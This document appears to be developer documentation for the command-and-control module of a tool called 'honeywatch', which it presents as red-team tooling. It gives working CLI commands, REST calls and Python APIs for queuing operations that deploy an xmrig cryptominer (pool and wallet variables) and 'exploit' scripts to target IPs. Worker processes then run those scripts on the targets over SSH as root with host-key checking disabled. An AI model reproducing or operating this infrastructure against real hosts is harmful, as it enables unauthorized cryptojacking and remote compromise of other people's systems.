# C2 Controller

`honeywatch/c2/` — control plane for red-team operations. Dashboard, REST API, and WebSocket live updates. Requires `pip install honeywatch[c2]` (`aiohttp>=3.8`, `websockets>=12.0`). Source: `c2/controller.py:411`, `c2/store.py:424`, `c2/worker.py:332`, `c2/tls.py:132`.

## Starting the Controller

```bash
pip install honeywatch[c2]

# Generate self-signed certs and start dashboard
honeywatch c2 --generate-certs --skip-vpn-check
# → certs/honeywatch.crt, certs/honeywatch.key, https://127.0.0.1:8443/

# Provide your own TLS
honeywatch c2 --tls-cert certs/honeywatch.crt --tls-key certs/honeywatch.key

# With bearer token
honeywatch c2 --api-token secret --skip-vpn-check
# workers must use the same token

# Custom bind / DB
honeywatch c2 --host 0.0.0.0 --port 8443 --db honeywatch.db --skip-vpn-check
```

Config keys (`config.toml` `[c2]`):

```toml
[c2]
enabled = false
host = "0.0.0.0"
port = 8443
# tls_cert = "certs/honeywatch.crt"
# tls_key = "certs/honeywatch.key"
# api_token = "shared-secret"
# db = "honeywatch.db"
```

`honeywatch/cli.py:890` `_cmd_c2` builds `C2Store`, `build_ssl_context`, `Controller(...).run()`.

## Dashboard

Served at `GET /` — `_DASHBOARD_HTML` (`controller.py:411`) with CSS vars, grid of workers / operations / tasks / events. JavaScript opens `wss://` or `ws://` to `/ws` and renders live snapshots. For production, front with nginx (see TLS section).

## REST API

All handlers in `Controller` (`controller.py:411`). When `api_token` is set, every request must carry `Authorization: Bearer <token>` header or `?token=<token>` query (`_build_auth_middleware`, `_authorized`).

| Method | Path | Description |
|---|---|---|
| `GET` | `/` | dashboard HTML |
| `GET` | `/ws` | WebSocket (401 if unauthorized) |
| `GET` | `/api/health` | `{ok: true}` |
| `GET` | `/api/workers` | list workers (query `active_within_s`) |
| `GET` | `/api/operations?status=&limit=` | list operations |
| `POST` | `/api/operations` | create operation `{payload_id, target_ips, manifest}` → `{id}` + broadcast `operation_created` |
| `GET` | `/api/tasks?operation_id=&status=&worker_id=&limit=` | list tasks |
| `POST` | `/api/tasks/claim` | claim next pending task for `{worker_id, categories}` → task or 204 + broadcast `task_claimed` |
| `POST` | `/api/tasks/{task_id}/result` | complete task `{worker_id, success, result}` + broadcast `task_completed` |

Helpers: `_json_response`, `_op_dict`, `_task_dict`, `_target_to_dict`.

### Create operation via API

```bash
curl -X POST https://127.0.0.1:8443/api/operations \
  -H "Authorization: Bearer secret" -k \
  -H "Content-Type: application/json" \
  -d '{"payload_id":"xmrig","target_ips":["1.2.3.4"],"manifest":{"variables":{"pool":"stratum+tcp://pool:3333","wallet":"W"},"scripts":{"1.2.3.4":"..."}}}'
```

Or use `honeywatch deploy --controller-url http://127.0.0.1:8443`.

## WebSocket

`GET /ws` — after auth, `_websocket` handler:

- Pushes snapshot (`_push_snapshot`) of workers/operations/tasks.
- Handles `ping`→`pong`, `register_worker` messages.
- Broadcasts `operation_created`, `task_claimed`, `task_completed` to all `_clients: list[WebSocketResponse]`.

Workers can use WebSocket transport instead of polling — see Worker.

## TLS (`c2/tls.py`)

`honeywatch/c2/tls.py:132`:

```python
from honeywatch.c2.tls import generate_self_signed, ensure_self_signed_pair, build_ssl_context, render_nginx_config, write_nginx_config

cert, key = generate_self_signed("certs/honeywatch.crt", "certs/honeywatch.key", hostname="honeywatch.local", days=365)
# via openssl req -x509 -nodes -newkey rsa:2048

cert, key = ensure_self_signed_pair("certs", hostname="honeywatch.local")  # creates if missing

ctx = build_ssl_context(cert, key)  # SSLContext or None → passed to Controller

nginx_conf = render_nginx_config(controller_port=8443, cert_path=cert, key_path=key, nginx_port=443, server_name="honeywatch.local")
write_nginx_config("/etc/nginx/sites-available/honeywatch", controller_port=8443, cert_path=cert, key_path=key)
```

`NGINX_TEMPLATE` proxies `127.0.0.1:{{controller_port}}`, listens `{{nginx_port}} ssl`, upgrades `Connection: upgrade` for WebSocket, timeout `86400`.

`build_ssl_context` uses `ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)` + `load_cert_chain`.

## C2 Store (`c2/store.py`)

`honeywatch/c2/store.py:424`:

**Schema:**

- `c2_operations(id PK, payload_id, target_ips TEXT csv, status, manifest TEXT json, result_log TEXT json, created_at, updated_at)` — status `pending|running|completed|failed|cancelled`, id `op-<hex12>`.
- `c2_tasks(id PK, operation_id FK, payload_id, category, target_json, script, variables_json, status, worker_id, result_json, created_at, updated_at)` — status `pending|running|completed|failed`.
- `c2_workers(id PK, categories csv, connected_at, last_seen)` — id `worker-<hex8>`.

**Class `C2Store(db_path)`:**

```python
from honeywatch.c2.store import C2Store

store = C2Store("honeywatch.db")
op = store.create_operation(payload_id="xmrig", target_ips=["1.2.3.4"], manifest={...})  # id op-abc...
store.get_operation(op.id)
store.update_operation_status(op.id, "completed", result={...})  # appends to result_log
store.list_operations(status="running", limit=100)

store.create_task(task: WorkerTask)
task = store.claim_next_task(worker_id="worker-abc", categories=["miner"])  # atomic UPDATE ... WHERE status='pending'
store.complete_task(task_id, worker_id, success=True, result={...})
store.list_tasks(operation_id=op.id, status="pending", limit=50)
store.register_worker(worker_id, categories)  # upsert ON CONFLICT
store.heartbeat_worker(worker_id)
store.list_workers(active_within_s=60)
```

Helpers: `_now()`, `_new_id(prefix)`, `_encode/_decode`, `_target_to_dict/_from_dict` (strips `ssh_pass`).

Used by `ops/deploy.py:192` `enqueue_operation` and `Controller` handlers.

## Worker (`c2/worker.py`)

`honeywatch/c2/worker.py:332` `Worker`.

```python
from honeywatch.c2 import Worker

worker = Worker(
    controller_url="http://127.0.0.1:8443",
    worker_id=None,                    # auto worker-<hex8>
    categories=["miner","exploit"],    # allowed task categories
    exec_mode="dry_run",               # dry_run | local_simulate | ssh
    poll_interval=5.0,
    ssh_user="root",
    ssh_key="/path/to/id_rsa",
    api_token="secret",
)
await worker.run()   # or worker.run() via asyncio.run in CLI
worker.stop()        # sets _shutdown
```

**Exec modes:**

| Mode | What happens |
|---|---|
| `dry_run` | report `script_length` without running (default, safe for review) |
| `local_simulate` | run the script on the worker host itself via `_run_shell` (temp `.sh`, `chmod 700`, `/bin/sh`, 600 s timeout) |
| `ssh` | run on the target via `_run_ssh` (`ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i key user@ip` with script on stdin) |

**Transports:**

- **Polling** (`_run_polling` loop): `claim_task() → execute_task() → report_result()`, sleep `poll_interval` on empty/error.
- **WebSocket** (`_run_websocket`): translate `http→ws`, add `?token=`, send `register_worker`, recv task messages, fallback to HTTP `claim` on timeout.

**HTTP** (`_request` via `urllib.request`, stdlib):

- `claim_task() -> WorkerTask|None` — `POST /api/tasks/claim` with `{worker_id, categories}`.
- `report_result(task_id, success, result)` — `POST /api/tasks/{id}/result`.
- `execute_task(task) -> dict` — dispatches by `exec_mode`.

`class WorkerError` for `URLError`/`HTTPError` (including 204 empty).

**Starting:**

```bash
honeywatch worker --categories miner --exec-mode dry_run
honeywatch worker --categories miner,exploit --exec-mode ssh --ssh-user admin --ssh-key ~/.ssh/id_rsa --controller-url http://c2:8443
honeywatch worker --categories miner --exec-mode local_simulate --poll-interval 2.0
```

Config `[workers]` keys: `controller_url`, `categories`, `poll_interval`, `exec_mode`, `ssh_user`, `ssh_key`.
